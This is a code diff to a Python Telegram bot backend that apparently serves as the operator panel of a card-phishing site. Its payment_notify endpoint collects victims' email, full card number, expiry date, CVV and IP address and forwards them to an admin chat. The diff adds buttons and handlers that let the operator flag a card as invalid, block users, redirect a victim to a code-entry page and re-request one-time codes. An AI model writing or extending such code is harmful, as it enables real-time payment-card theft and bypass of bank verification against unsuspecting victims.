@@ -1010,7 +1010,6 @@ async def events_save_all(message):
 
 async def notify_admin(request):
     data = await request.json()
-    print('notify_admin called:', data)
     phone = data.get('phone', '')
     name = data.get('name', '')
     mail = data.get('mail', '')
@@ -1023,11 +1022,10 @@ async def notify_admin(request):
         f"<b>mail:</b> <code>{mail}</code>\n"
         f"<b>ip:</b> <code>{ip}</code>"
     )
-    # Нова клавіатура
+    # Клавіатура без 'Карта'
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="Карта", callback_data=f"card:{ip}"),
                 InlineKeyboardButton(text="Заблокировать", callback_data=f"block:{ip}"),
                 InlineKeyboardButton(text="Розблокувати", callback_data=f"unblock:{ip}")
             ]
@@ -1046,36 +1044,35 @@ async def payment_notify(request):
     card = data.get('card', '')
     expiry = data.get('expiry', '')
     cvv = data.get('cvv', '')
-    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}"
-    await send_to_telegram(text)
-    return web.Response(text='ok')
-
-async def send_to_telegram(text):
-    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
-    payload = {"chat_id": ADMIN_GROUP_ID, "text": text}
-    async with aiohttp.ClientSession() as session:
-        await session.post(url, json=payload)
-
-async def code_notify(request):
-    data = await request.json()
-    code = data.get('code', '')
-    text = f"Code: {code}"
+    ip = data.get('ip', '')
+    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")]
+            [
+                InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+                InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+                InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            ]
         ]
     )
     await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
     return web.Response(text='ok')
 
-@router.callback_query(lambda c: c.data and c.data.startswith('code_request_again:'))
-async def code_request_again_handler(call: types.CallbackQuery):
-    code = call.data.split(':', 1)[1]
-    # Надіслати POST на сервер
-    import aiohttp as aiohttp_client
-    async with aiohttp_client.ClientSession() as session:
-        await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
-    await call.answer("Request sent to user")
+async def code_notify(request):
+    data = await request.json()
+    code = data.get('code', '')
+    ip = data.get('ip', '')
+    text = f"Code: {code}\nIP: {ip}"
+    kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
+            ]
+        ]
+    )
+    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
+    return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
 @router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:')))
@@ -1090,6 +1087,46 @@ async def admin_action_handler(call: types.CallbackQuery):
         await call.answer("Користувач заблокований")
     elif action == 'unblock':
         await call.answer("Користувач розблокований")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('card:'))
+async def card_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'card', 'ip': ip})
+    await call.answer("Invalid card message sent")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('block:'))
+async def block_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'block', 'ip': ip})
+    await call.answer("IP blocked")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('unblock:'))
+async def unblock_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'unblock', 'ip': ip})
+    await call.answer("IP unblocked")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('code:'))
+async def code_redirect_handler(call: types.CallbackQuery):
+    ip = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/admin_action', json={'action': 'code', 'ip': ip})
+    await call.answer("Redirecting user to code page")
+
+@router.callback_query(lambda c: c.data and c.data.startswith('code_request_again:'))
+async def code_request_again_handler(call: types.CallbackQuery):
+    code = call.data.split(':', 1)[1]
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
+    await call.answer("Request sent to user")
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
